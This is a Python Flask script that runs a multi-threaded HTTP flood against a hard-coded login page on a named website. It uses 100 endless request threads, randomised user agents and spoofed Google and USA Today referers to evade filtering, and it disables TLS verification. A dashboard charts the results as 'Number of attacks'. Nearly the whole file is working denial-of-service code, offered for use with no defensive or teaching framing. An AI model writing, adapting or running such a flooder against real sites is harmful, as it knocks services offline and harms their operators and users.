from flask import Flask, jsonify, render_template_string
import requests
import threading
from fake_useragent import UserAgent
import urllib3
import time
import random

app = Flask(__name__)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
ua = UserAgent()
accept_charset = "ISO-8859-1,utf-8;q=0.7,*;q=0.7"
headers_referers = [
    "http://www.google.com/?q=",
    "http://www.usatoday.com/search/results?q=",
    "http://engadget.search.aol.com/search?q=",
]
stats = {"good": {}, "failed": 0}
lock = threading.Lock()

def chek(url):
    while True:
        try:
            headers = {
                "User-Agent": ua.random,
                "Accept-Language": "en-US,en;q=0.9",
                "Accept-Encoding": "gzip, deflate, br",
                "Connection": "keep-alive",
                "Accept-Charset": accept_charset,
                "Referer": random.choice(headers_referers),
            }
            response = requests.get(url, headers=headers, verify=False)
            status_code = response.status_code
            with lock:
                stats["good"].setdefault(status_code, 0)
                stats["good"][status_code] += 1
        except requests.exceptions.RequestException:
            with lock:
                stats["failed"] += 1

def start_threads():
    target_url = "https://alamdar-mod.com/Revenge/public/login"
    for _ in range(100):
        thread = threading.Thread(target=chek, args=(target_url,))
        thread.daemon = True
        thread.start()

html_template = """
<!DOCTYPE html>
<html lang=\"ar\">
<head>
    <meta charset=\"UTF-8\">
    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
    <title>dashboard</title>
    <script src=\"https://cdn.jsdelivr.net/npm/chart.js\"></script>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; direction: rtl; }
        canvas { max-width: 600px; margin: 20px auto; }
    </style>
</head>
<body>
    <h1>dashboard</h1>
    <canvas id=\"statsChart\"></canvas>
    <script>
        async function fetchData() {
            const response = await fetch('/api/stats');
            const data = await response.json();
            updateChart(data);
        }
        function updateChart(data) {
            const ctx = document.getElementById('statsChart').getContext('2d');
            const statusCodes = Object.keys(data.good).map(code => `HTTP ${code}`);
            const values = Object.values(data.good);
            const failedRequests = data.failed;
            
            if (window.myChart) window.myChart.destroy();
            window.myChart = new Chart(ctx, {
                type: 'bar',
                data: {
                    labels: [...statusCodes, 'Failed '],
                    datasets: [{
                        label: 'Number of attacks ',
                        data: [...values, failedRequests],
                        backgroundColor: ['green', 'red']
                    }]
                }
            });
        }
        fetchData();
        setInterval(fetchData, 5000);
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return render_template_string(html_template)

@app.route('/api/stats')
def api_stats():
    with lock:
        return jsonify(stats)

if __name__ == '__main__':
    threading.Thread(target=start_threads, daemon=True).start()
    app.run(host='0.0.0.0', port=5000)
